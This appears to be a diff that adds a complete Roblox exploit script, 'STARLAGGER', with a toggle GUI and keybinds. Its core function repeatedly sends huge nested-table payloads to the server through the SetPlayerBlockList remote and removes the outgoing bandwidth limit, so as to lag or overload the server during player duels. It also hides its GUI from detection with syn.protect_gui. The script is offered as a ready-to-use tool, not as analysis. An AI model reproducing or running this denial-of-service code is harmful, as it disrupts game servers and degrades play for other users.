@@ -1,0 +1,259 @@
+repeat task.wait() until game:IsLoaded()
+
+local Players      = game:GetService("Players")
+local UIS          = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local LP           = Players.LocalPlayer
+
+-- ============================================================
+-- STATE & SETTINGS
+-- ============================================================
+local State = {
+    duelLaggerActive = false,
+    duelLaggerThread = nil,
+    guiVisible = true
+}
+
+local Keys = {
+    toggleKey = Enum.KeyCode.F, -- << SCHIMBؤ‚ LITERA DE AICI DACؤ‚ VREI ALT KEYBIND
+    guiHide   = Enum.KeyCode.LeftControl
+}
+
+local isTouchEnabled     = UIS.TouchEnabled
+local duelLaggerWaitTime = isTouchEnabled and 5.8 or 0.25
+
+local C = {
+    bg         = Color3.fromRGB(11, 11, 14),
+    card       = Color3.fromRGB(18, 18, 22),
+    cardActive = Color3.fromRGB(35, 16, 20),
+    border     = Color3.fromRGB(32, 32, 38),
+    text       = Color3.fromRGB(255, 255, 255),
+    textSub    = Color3.fromRGB(150, 150, 160),
+    accent1    = Color3.fromRGB(255, 45, 85),
+    accent2    = Color3.fromRGB(180, 15, 50),
+    pillOff    = Color3.fromRGB(28, 28, 32),
+    dotOff     = Color3.fromRGB(80, 80, 85)
+}
+
+local duelLaggerStatusLabel = nil
+local duelLaggerSwitchBall  = nil
+local row                   = nil
+local rowStroke             = nil
+
+-- ============================================================
+-- CORE LOGIC
+-- ============================================================
+local function duelBomb(amt)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, amt do 
+        local t = {}
+        table.insert(z, t)
+        z = t 
+    end
+    local max = math.min(499999 / (amt + 2), 1500)
+    for i = 1, max do 
+        table.insert(main, spam) 
+    end
+    pcall(function() 
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+    end)
+end
+
+local function toggleDuelLagger()
+    State.duelLaggerActive = not State.duelLaggerActive
+    
+    if duelLaggerStatusLabel then
+        duelLaggerStatusLabel.Text = State.duelLaggerActive and "STATUS: RUNNING" or "STATUS: SLEEPING"
+        duelLaggerStatusLabel.TextColor3 = State.duelLaggerActive and C.accent1 or C.textSub
+    end
+    
+    if row and rowStroke then
+        TweenService:Create(row, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            BackgroundColor3 = State.duelLaggerActive and C.cardActive or C.card
+        }):Play()
+        TweenService:Create(rowStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Color = State.duelLaggerActive and C.accent1 or C.border
+        }):Play()
+    end
+    
+    if duelLaggerSwitchBall then
+        TweenService:Create(duelLaggerSwitchBall, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = State.duelLaggerActive and UDim2.new(1, -15, 0.5, -5) or UDim2.new(0, 5, 0.5, -5),
+            BackgroundColor3 = State.duelLaggerActive and C.text or C.dotOff,
+        }):Play()
+    end
+    
+    if State.duelLaggerActive then
+        State.duelLaggerThread = task.spawn(function()
+            while State.duelLaggerActive do
+                pcall(function() 
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) 
+                end)
+                duelBomb(270)
+                task.wait(duelLaggerWaitTime)
+            end
+        end)
+    else
+        if State.duelLaggerThread then 
+            task.cancel(State.duelLaggerThread)
+            State.duelLaggerThread = nil 
+        end
+    end
+end
+
+-- ============================================================
+-- GUI BUILD (STARLAGGER)
+-- ============================================================
+local gui = Instance.new("ScreenGui")
+gui.Name = "STARLaggerHub"
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 1000
+pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+pcall(function() gui.Parent = game:GetService("CoreGui") end)
+if not gui.Parent then pcall(function() gui.Parent = LP.PlayerGui end) end
+
+local mainOuter = Instance.new("Frame", gui)
+mainOuter.Name = "MainPanel"
+mainOuter.Size = UDim2.new(0, 270, 0, 130)
+mainOuter.Position = UDim2.new(0.05, 0, 0.3, 0)
+mainOuter.BackgroundColor3 = C.bg
+mainOuter.BorderSizePixel = 0
+
+local function mkCorner(p, r)
+    local c = Instance.new("UICorner", p); c.CornerRadius = UDim.new(0, r or 8); return c
+end
+
+mkCorner(mainOuter, 10)
+
+local mainStroke = Instance.new("UIStroke", mainOuter)
+mainStroke.Thickness = 1.5
+mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+local mainGrad = Instance.new("UIGradient", mainStroke)
+mainGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, C.accent1),
+    ColorSequenceKeypoint.new(1, C.accent2)
+})
+mainGrad.Rotation = 45
+
+-- Dragging System
+local dragging, dragInput, dragStart, startPos
+mainOuter.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = inp.Position; startPos = mainOuter.Position
+        inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+mainOuter.InputChanged:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then dragInput = inp end
+end)
+UIS.InputChanged:Connect(function(inp)
+    if inp == dragInput and dragging then
+        local dx = inp.Position.X - dragStart.X; local dy = inp.Position.Y - dragStart.Y
+        mainOuter.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + dx, startPos.Y.Scale, startPos.Y.Offset + dy)
+    end
+end)
+
+-- Header Title
+local title = Instance.new("TextLabel", mainOuter)
+title.Size = UDim2.new(1, -24, 0, 40)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "STARLAGGER"
+title.TextColor3 = C.text
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Top Glow
+local glow = Instance.new("Frame", mainOuter)
+glow.Size = UDim2.new(0, 6, 0, 6)
+glow.Position = UDim2.new(1, -18, 0, 17)
+glow.BackgroundColor3 = C.accent1
+glow.BorderSizePixel = 0
+mkCorner(glow, 3)
+
+-- Main Row Module
+row = Instance.new("Frame", mainOuter)
+row.Size = UDim2.new(1, -24, 0, 64)
+row.Position = UDim2.new(0, 12, 0, 44)
+row.BackgroundColor3 = C.card
+row.BorderSizePixel = 0
+mkCorner(row, 8)
+
+rowStroke = Instance.new("UIStroke", row)
+rowStroke.Color = C.border
+rowStroke.Thickness = 1
+rowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Label Info
+local lbl = Instance.new("TextLabel", row)
+lbl.Size = UDim2.new(1, -100, 0, 22)
+lbl.Position = UDim2.new(0, 14, 0, 12)
+lbl.BackgroundTransparency = 1
+lbl.Text = "Network Duel Lagger"
+lbl.TextColor3 = C.text
+lbl.Font = Enum.Font.GothamBold
+lbl.TextSize = 13
+lbl.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Label Status
+duelLaggerStatusLabel = Instance.new("TextLabel", row)
+duelLaggerStatusLabel.Size = UDim2.new(1, -100, 0, 16)
+duelLaggerStatusLabel.Position = UDim2.new(0, 14, 0, 32)
+duelLaggerStatusLabel.BackgroundTransparency = 1
+duelLaggerStatusLabel.Text = "STATUS: SLEEPING"
+duelLaggerStatusLabel.TextColor3 = C.textSub
+duelLaggerStatusLabel.Font = Enum.Font.GothamSemibold
+duelLaggerStatusLabel.TextSize = 10
+duelLaggerStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Visual Keybind Badge Dynamically Updated
+local badge = Instance.new("TextLabel", row)
+badge.Size = UDim2.new(0, 18, 0, 18)
+badge.Position = UDim2.new(0, 150, 0, 14)
+badge.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+badge.Text = Keys.toggleKey.Name
+badge.TextColor3 = C.textSub
+badge.Font = Enum.Font.GothamBold
+badge.TextSize = 10
+mkCorner(badge, 4)
+local badgeStroke = Instance.new("UIStroke", badge)
+badgeStroke.Color = C.border
+badgeStroke.Thickness = 1
+
+-- Switch Layout
+local pill = Instance.new("Frame", row)
+pill.Size = UDim2.new(0, 36, 0, 20)
+pill.Position = UDim2.new(1, -50, 0.5, -10)
+pill.BackgroundColor3 = C.pillOff
+mkCorner(pill, 10)
+local pillStroke = Instance.new("UIStroke", pill)
+pillStroke.Color = C.border
+pillStroke.Thickness = 1
+
+duelLaggerSwitchBall = Instance.new("Frame", pill)
+duelLaggerSwitchBall.Size = UDim2.new(0, 10, 0, 10)
+duelLaggerSwitchBall.Position = UDim2.new(0, 5, 0.5, -5)
+duelLaggerSwitchBall.BackgroundColor3 = C.dotOff
+mkCorner(duelLaggerSwitchBall, 5)
+
+-- Button Trigger
+local btn = Instance.new("TextButton", row)
+btn.Size = UDim2.new(1, 0, 1, 0)
+btn.BackgroundTransparency = 1
+btn.Text = ""
+btn.MouseButton1Click:Connect(toggleDuelLagger)
+
+-- ============================================================
+-- INPUT SYSTEM (MAPPED KEYBIND)
+-- ============================================================
+UIS.InputBegan:Connect(function(inp, gpe)
+    if gpe then return end
+    if inp.KeyCode == Keys.guiHide then
+        State.guiVisible = not State.guiVisible
+        mainOuter.Visible = State.guiVisible
+    elseif inp.KeyCode == Keys.toggleKey then
+        toggleDuelLagger()
+    end
+end)
